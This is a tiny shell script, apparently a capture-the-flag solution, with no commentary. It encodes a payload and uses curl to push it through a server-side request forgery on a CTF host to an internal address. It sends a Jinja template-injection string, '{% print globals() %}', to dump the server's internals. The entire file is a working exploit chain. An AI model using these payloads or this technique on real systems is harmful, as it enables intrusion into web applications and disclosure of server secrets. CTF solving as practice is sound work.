#!/bin/sh

fuck(){
	pl=$(echo "$1" | tr -d '\n' | xxd -plain | sed 's/\(..\)/%\1/g');
	curl -vv -k -s "http://ctf473831530.yulige.top:12345/?url=http://172.11.243.81:8080/yulige/$pl" --output -
}

fuck '\{% print globals() %\}'
